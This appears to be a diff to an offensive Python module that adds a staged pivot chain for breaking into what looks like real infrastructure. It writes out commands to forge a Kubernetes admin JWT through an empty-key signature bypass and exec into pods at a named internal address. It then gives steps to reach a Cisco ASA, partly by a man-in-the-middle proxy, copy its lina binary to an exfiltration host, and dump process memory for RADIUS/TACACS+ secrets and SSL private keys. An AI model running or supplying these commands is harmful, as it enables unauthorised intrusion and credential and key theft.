@@ -876,6 +876,124 @@ LINA_AAA_STATE_MACHINE = {
 }
 
 
+# ─── MACSTADIUM PIVOT CHAIN → LINA CODE EXTRACTION ──────────────────────────
+#
+# Attack chain: JWT forge (offline) → K8s exec (VPN-gated) → virsh console →
+#               macOS VM shell → ASA management → lina binary + process memory
+#
+# VPN requirement: K8s API at 10.221.188.19:6443 is internal only.
+#
+# Stage 1: JWT forge (offline — no VPN required)
+#   from modules.orka_jwt_dynamic_re import forge_system_masters
+#   token = forge_system_masters('admin')   # empty-key HS256 bypass at 0x1844660
+#
+# Stage 2: K8s exec into pod (VPN required)
+#   kubectl --server=https://10.221.188.19:6443 --token=<forged> \
+#           --insecure-skip-tls-verify \
+#           exec -n orka-default <pod> -- /bin/sh
+#   OR: curl -H "Authorization: Bearer <forged>" \
+#       https://10.221.188.19:6443/api/v1/namespaces/orka-default/pods
+#
+# Stage 3: virsh console → macOS VM
+#   virsh -c qemu:///system console <macos-vm-name>
+#   (or virsh list --all to find VM name first)
+#
+# Stage 4: ASA access from macOS VM
+#   Option A — console: if macOS VM has serial/USB connection to ASA
+#   Option B — ASDM: use ASDMMitmProxy disabled for direct admin access
+#   Option C — SSH: ssh -l admin <ASA_MGMT_IP> (if SSH enabled on mgmt interface)
+#
+# Stage 5: lina binary extraction from ASA shell
+#   ASA# terminal monitor
+#   ASA# dir disk0:/           — find firmware image
+#   ASA# show version          — confirm version string (match to downloaded binary)
+#   # If ASA allows shell (debug menu or known exploit):
+#   # cp /asa/bin/lina /mnt/disk0/ then tftp to exfil host
+#
+# Stage 6: lina process memory dump (post-shell)
+#   LINA_PID=$(pidof lina)
+#   cat /proc/$LINA_PID/maps | grep rw-p   # identify heap + .data ranges
+#   dd if=/proc/$LINA_PID/mem bs=4096 skip=$((RW_VADDR/4096)) \
+#      count=$((RW_SIZE/4096)) of=/tmp/lina_heap.bin 2>/dev/null
+#   strings -n 8 /tmp/lina_heap.bin | grep -E "^[A-Za-z0-9!@#$%^&*_-]{8,64}$"
+#   # → RADIUS shared secrets, TACACS+ keys, SSL trustpoint private key material
+
+MACSTADIUM_PIVOT_CHAIN = {
+    'stage_1_jwt_forge': {
+        'requires': 'nothing (offline)',
+        'cmd': (
+            "from modules.orka_jwt_dynamic_re import forge_system_masters; "
+            "token = forge_system_masters('admin')"
+        ),
+        'binary_basis': '0x1844660 SigningMethodHMAC.Verify accepts empty []byte{} key',
+    },
+    'stage_2_k8s_exec': {
+        'requires': 'VPN (10.221.188.0/24)',
+        'api':      'https://10.221.188.19:6443',
+        'cmd_list_pods': (
+            'kubectl --server=https://10.221.188.19:6443 --token=<jwt> '
+            '--insecure-skip-tls-verify get pods -n orka-default'
+        ),
+        'cmd_exec': (
+            'kubectl --server=https://10.221.188.19:6443 --token=<jwt> '
+            '--insecure-skip-tls-verify exec -n orka-default <pod> -- /bin/sh'
+        ),
+    },
+    'stage_3_virsh_console': {
+        'cmd_list': 'virsh -c qemu:///system list --all',
+        'cmd_console': 'virsh -c qemu:///system console <macos-vm-name>',
+        'alt': 'virsh domiflist <vm> | get bridge → ARP scan bridge for VM IP → SSH',
+    },
+    'stage_4_asa_access': {
+        'option_a_ssh': 'ssh -l admin <ASA_MGMT_IP>  (if SSH enabled)',
+        'option_b_telnet': 'telnet <ASA_MGMT_IP>  (legacy, if enabled)',
+        'option_c_asdm_mitm': (
+            'python3 cisco_asa_lina_re.py mitm --listen 0.0.0.0:443 '
+            '--target <ASA_MGMT_IP>:443 --cert proxy.pem --key proxy.key'
+        ),
+    },
+    'stage_5_lina_binary': {
+        'show_version': 'show version  | include Software Version',
+        'dir_flash':    'dir disk0:/ | include asa',
+        'copy_tftp':    'copy disk0:/<image>.bin tftp://<exfil_host>/<image>.bin',
+        'debug_shell':  (
+            'On older ASA: debug fips  (drops to bash on some versions)\n'
+            'Or: session do cli  (FTD management shell)\n'
+            'Or: expert  (FTD expert mode → bash)'
+        ),
+        'lina_path':    '/asa/bin/lina (confirmed in CPIO rootfs)',
+    },
+    'stage_6_memory_dump': {
+        'find_lina_pid':   'LINA_PID=$(pidof lina)',
+        'maps':            'cat /proc/$LINA_PID/maps | grep rw-p',
+        'dump_heap':       (
+            'dd if=/proc/$LINA_PID/mem bs=4096 '
+            'skip=$((0xRW_START/4096)) count=$((0xRW_SIZE/4096)) '
+            'of=/tmp/lina_heap.bin 2>/dev/null'
+        ),
+        'extract_secrets': 'strings -n 8 /tmp/lina_heap.bin | grep -E "^[A-Za-z0-9!@#$%^&*_-]{8,64}$"',
+        'extract_ssl_key': (
+            'grep shm /proc/$LINA_PID/maps  → dump shared memory for Snort IPC\n'
+            'Scan lina heap for EVP_PKEY magic → SSL inspection CA private key'
+        ),
+        'ipc_surfaces': [
+            'shared memory segments (shmget) → Snort/LINA data exchange',
+            'UNIX domain sockets in /var/run/ → management daemon IPC',
+            'message queues (ipcs -q) → packet queue between kernel and LINA',
+        ],
+    },
+    'stage_6_config_dump': {
+        'asa_shell': [
+            'cat /etc/asa/config',
+            'cat /mnt/disk0/running-config',
+            'cat /mnt/disk0/startup-config',
+        ],
+        'type7_decode': 'python3 -c "exec(open(\'cisco_radius_ise_re.py\').read()); print(cisco_type7_decode(\'<hash>\'))"',
+        'secret_targets': ['radius-server key', 'tacacs-server key', 'enable secret', 'username.*password'],
+    },
+}
+
+
 # ─── MEMORY DUMP TECHNIQUE (post-pivot) ─────────────────────────────────────
 #
 # If code execution is achieved on the ASA (e.g. via WebVPN shell injection,
@@ -886,9 +1004,14 @@ LINA_AAA_STATE_MACHINE = {
 
 MEMORY_DUMP_PROCEDURE = {
     'step1': 'cat /proc/$(pidof lina)/maps | grep rw-p | head -20',
-    'step2': 'dd if=/proc/$(pidof lina)/mem bs=1 skip=$((0xDATA_ADDR)) count=$((0xSECTION_SIZE)) of=lina_data.bin 2>/dev/null',
+    'step2': 'dd if=/proc/$(pidof lina)/mem bs=4096 skip=$((0xDATA_ADDR/4096)) count=$((0xSECTION_SIZE/4096)) of=lina_data.bin 2>/dev/null',
     'step3': 'strings -n 8 lina_data.bin | grep -E "^[A-Za-z0-9!@#$%^&*_-]{8,64}$"',
-    'rationale': 'shared secrets stored as plaintext C strings in aaa_server_t.secret field',
+    'step4': 'grep shm /proc/$(pidof lina)/maps  # shared mem with Snort — may contain flow keys',
+    'rationale': (
+        'shared secrets stored as plaintext C strings in aaa_server_t.secret field; '
+        'SSL inspection CA private key in EVP_PKEY struct on heap; '
+        'Snort IPC via shared memory segments also in process map'
+    ),
 }
 
 
